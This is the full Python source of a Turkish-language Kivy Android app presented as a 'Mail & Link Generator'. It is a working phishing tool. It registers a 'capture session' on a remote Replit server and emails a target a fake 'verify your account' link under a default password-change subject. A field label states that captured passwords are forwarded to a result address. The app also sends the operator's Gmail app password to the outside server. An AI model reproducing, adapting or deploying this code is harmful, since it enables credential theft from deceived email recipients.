"""
Mail & Link Generator - Android APK
Kivy ile yazılmış 5 alanlı e-posta & link üreteci.

PC'de test:
  pip install -r requirements.txt
  python main.py

APK için:
  pip install buildozer
  buildozer android debug
"""

import smtplib
import ssl
import threading
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

import requests

from kivy.app import App
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.metrics import dp
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from kivy.uix.popup import Popup
from kivy.uix.scrollview import ScrollView
from kivy.uix.textinput import TextInput

# ── Sunucu adresi ──────────────────────────────────────────
BASE_URL = "https://mail-link-generator--azechat060.replit.app"
# ───────────────────────────────────────────────────────────

Window.clearcolor = (0.96, 0.97, 0.99, 1)

# ── Renkler ────────────────────────────────────────────────
C_PRIMARY   = (0.13, 0.31, 0.78, 1)   # koyu mavi
C_WHITE     = (1, 1, 1, 1)
C_BG_INPUT  = (1, 1, 1, 1)
C_TEXT      = (0.1, 0.12, 0.22, 1)
C_HINT      = (0.6, 0.62, 0.68, 1)
C_READONLY  = (0.93, 0.95, 0.99, 1)
C_SUCCESS   = (0.08, 0.6, 0.4, 1)
C_LABEL     = (0.25, 0.28, 0.42, 1)
# ───────────────────────────────────────────────────────────


def make_label(text, font_size=13, bold=False, color=C_LABEL, height=dp(22)):
    lbl = Label(
        text=text,
        font_size=dp(font_size),
        bold=bold,
        color=color,
        size_hint_y=None,
        height=height,
        halign="left",
        valign="middle",
    )
    lbl.bind(size=lbl.setter("text_size"))
    return lbl


def make_input(password=False, multiline=False, hint="", height=dp(46)):
    return TextInput(
        password=password,
        multiline=multiline,
        hint_text=hint,
        size_hint_y=None,
        height=height,
        padding=[dp(12), dp(11)],
        background_color=C_BG_INPUT,
        foreground_color=C_TEXT,
        cursor_color=C_PRIMARY,
        font_size=dp(14),
        write_tab=False,
    )


def field(label_text, password=False, multiline=False, hint=""):
    """Label + TextInput çifti döndürür: (BoxLayout, TextInput)"""
    h_input = dp(80) if multiline else dp(46)
    box = BoxLayout(
        orientation="vertical",
        size_hint_y=None,
        height=dp(22) + dp(6) + h_input,
        spacing=dp(4),
    )
    box.add_widget(make_label(label_text))
    inp = make_input(password=password, multiline=multiline, hint=hint, height=h_input)
    box.add_widget(inp)
    return box, inp


class MailLinkApp(App):

    def build(self):
        self.title = "Mail & Link Generator"

        scroll = ScrollView(do_scroll_x=False)
        self.main = BoxLayout(
            orientation="vertical",
            padding=[dp(18), dp(24), dp(18), dp(24)],
            spacing=dp(14),
            size_hint_y=None,
        )
        self.main.bind(minimum_height=self.main.setter("height"))

        # ── Başlık ────────────────────────────────────────
        self.main.add_widget(make_label(
            "Mail & Link Generator",
            font_size=21, bold=True,
            color=C_PRIMARY, height=dp(40),
        ))
        self.main.add_widget(make_label(
            "5 alanı doldurun — link otomatik oluşturulur",
            font_size=12, color=(0.5, 0.52, 0.6, 1), height=dp(20),
        ))
        self.main.add_widget(BoxLayout(size_hint_y=None, height=dp(6)))

        # ── 5 Alan ────────────────────────────────────────
        b1, self.f_message = field(
            "1.  Mesaj İçeriği",
            multiline=True,
            hint="Alıcıya gönderilecek e-posta metni...",
        )
        self.main.add_widget(b1)

        b2, self.f_sender = field(
            "2.  Gönderici E-posta",
            hint="ornek@gmail.com",
        )
        self.main.add_widget(b2)

        b3, self.f_pass = field(
            "3.  E-posta Uygulama Şifresi  (16 karakter)",
            password=True,
            hint="Gmail → Güvenlik → Uygulama Şifreleri",
        )
        self.main.add_widget(b3)

        b4, self.f_receiver = field(
            "4.  Alıcı E-posta",
            hint="alici@example.com",
        )
        self.main.add_widget(b4)

        b5, self.f_result = field(
            "5.  Sonuç E-postası  (yakalanan şifreler buraya gider)",
            hint="sonuc@example.com",
        )
        self.main.add_widget(b5)

        # ── Konu (opsiyonel) ──────────────────────────────
        bk, self.f_subject = field(
            "Konu  (opsiyonel)",
            hint="Şifre Değişikliği Bildirimi",
        )
        self.main.add_widget(bk)

        self.main.add_widget(BoxLayout(size_hint_y=None, height=dp(4)))

        # ── Gönder Butonu ─────────────────────────────────
        self.btn_send = Button(
            text="OLUŞTUR VE GÖNDER",
            size_hint_y=None,
            height=dp(52),
            background_color=C_PRIMARY,
            color=C_WHITE,
            bold=True,
            font_size=dp(15),
        )
        self.btn_send.bind(on_press=self.on_send)
        self.main.add_widget(self.btn_send)

        # ── Üretilen Link (readonly) ──────────────────────
        b_link, self.f_link = field(
            "Üretilen Link  (e-postanın altına eklendi)",
            hint="Gönderilince burada görünür...",
        )
        self.f_link.readonly = True
        self.f_link.background_color = C_READONLY
        self.main.add_widget(b_link)

        scroll.add_widget(self.main)
        return scroll

    # ── Yardımcı: popup ───────────────────────────────────
    def popup(self, title, msg, color=C_TEXT):
        content = BoxLayout(orientation="vertical", padding=dp(14), spacing=dp(10))
        lbl = Label(text=msg, halign="center", color=color)
        lbl.bind(size=lbl.setter("text_size"))
        content.add_widget(lbl)
        btn = Button(
            text="Tamam", size_hint_y=None, height=dp(42),
            background_color=C_PRIMARY, color=C_WHITE,
        )
        p = Popup(title=title, content=content, size_hint=(0.88, 0.42))
        btn.bind(on_press=p.dismiss)
        content.add_widget(btn)
        p.open()

    def set_btn(self, text, enabled=True, color=None):
        """UI thread'de buton metnini & rengini günceller."""
        def _set(dt):
            self.btn_send.text = text
            self.btn_send.disabled = not enabled
            self.btn_send.background_color = color or C_PRIMARY
        Clock.schedule_once(_set, 0)

    # ── Ana işlem ─────────────────────────────────────────
    def on_send(self, *_):
        message  = self.f_message.text.strip()
        sender   = self.f_sender.text.strip()
        password = self.f_pass.text.strip()
        receiver = self.f_receiver.text.strip()
        result   = self.f_result.text.strip()
        subject  = self.f_subject.text.strip() or "Şifre Değişikliği Bildirimi"

        if not all([message, sender, password, receiver, result]):
            self.popup("Eksik Alan", "Lütfen ilk 5 alanı eksiksiz doldurun.")
            return

        self.set_btn("Gönderiliyor...", enabled=False)
        threading.Thread(
            target=self._worker,
            args=(message, sender, password, receiver, result, subject),
            daemon=True,
        ).start()

    def _worker(self, message, sender, password, receiver, result, subject):
        try:
            # 1 ── Capture oturumu oluştur
            resp = requests.post(
                f"{BASE_URL}/api/sessions",
                json={
                    "senderEmail": sender,
                    "senderPassword": password,
                    "resultEmail": result,
                    "messageSubject": subject,
                },
                timeout=12,
            )

            if resp.status_code != 201:
                self.set_btn("OLUŞTUR VE GÖNDER")
                Clock.schedule_once(
                    lambda dt: self.popup("Sunucu Hatası", f"HTTP {resp.status_code}\n{resp.text}"), 0
                )
                return

            capture_url = resp.json()["captureUrl"]

            # 2 ── E-posta gönder
            plain = (
                f"{message}\n\n"
                f"──────────────────────────\n"
                f"Hesabınızı doğrulamak için:\n"
                f"{capture_url}\n"
                f"(Bu bağlantı yalnızca bir kez kullanılabilir.)"
            )
            html = f"""<html><body style="font-family:sans-serif;color:#222;">
  <p>{message.replace(chr(10),'<br>')}</p>
  <hr style="border:none;border-top:1px solid #ddd;margin:18px 0">
  <p>Hesabınızı doğrulamak için
     <a href="{capture_url}" style="color:#1d50c8;font-weight:bold;">buraya tıklayın</a>.
  </p>
  <p style="color:#999;font-size:12px;">Bu bağlantı yalnızca bir kez kullanılabilir.</p>
</body></html>"""

            msg = MIMEMultipart("alternative")
            msg["Subject"] = subject
            msg["From"]    = sender
            msg["To"]      = receiver
            msg.attach(MIMEText(plain, "plain", "utf-8"))
            msg.attach(MIMEText(html,  "html",  "utf-8"))

            ctx = ssl.create_default_context()
            with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=ctx) as srv:
                srv.login(sender, password)
                srv.sendmail(sender, receiver, msg.as_string())

            # 3 ── Başarı
            def _ok(dt):
                self.f_link.text = capture_url
                self.set_btn("OLUŞTUR VE GÖNDER", color=C_SUCCESS)
                self.popup("Başarılı!", f"E-posta gönderildi.\n\nLink:\n{capture_url}", color=C_SUCCESS)
                Clock.schedule_once(lambda *_: self.set_btn("OLUŞTUR VE GÖNDER"), 3)
            Clock.schedule_once(_ok, 0)

        except requests.exceptions.ConnectionError:
            self.set_btn("OLUŞTUR VE GÖNDER")
            Clock.schedule_once(
                lambda dt: self.popup("Bağlantı Hatası", f"Sunucuya ulaşılamadı.\n{BASE_URL}"), 0
            )
        except smtplib.SMTPAuthenticationError:
            self.set_btn("OLUŞTUR VE GÖNDER")
            Clock.schedule_once(
                lambda dt: self.popup("Gmail Hatası", "Kimlik doğrulama başarısız.\nUygulama Şifresini kontrol edin."), 0
            )
        except Exception as exc:
            self.set_btn("OLUŞTUR VE GÖNDER")
            Clock.schedule_once(lambda dt: self.popup("Hata", str(exc)), 0)


if __name__ == "__main__":
    MailLinkApp().run()
